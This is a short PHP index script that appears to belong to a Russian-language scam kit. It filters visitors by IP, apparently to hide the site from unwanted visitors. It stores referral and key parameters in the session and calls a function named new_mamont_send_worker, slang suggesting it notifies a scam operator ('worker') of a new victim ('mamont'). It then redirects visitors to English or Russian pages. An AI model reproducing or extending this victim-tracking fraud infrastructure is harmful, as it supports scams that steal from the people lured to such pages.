<?php

include('layout/ru/head.php');
include('vender/logic.php');
$block = check_ip();
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

if ($block == false) {
    header('Location: ' . 'error.php');
}
check_review();
if (isset($_GET['ref'])) {
    if (!isset($_SESSION)) {
        session_start();
    }
    $_SESSION['ref'] = $_GET['ref'];
}
if (isset($_GET['key'])) {
    if (!isset($_SESSION)) {
        session_start();
    }
    $_SESSION['key'] = $_GET['key'];
    new_mamont_send_worker($_GET['key']);
}
if($lang == 'en'){
    header('Location: ' . 'en/index.php');
}else{
    header('Location: ' . 'ru/index.php');
}

?>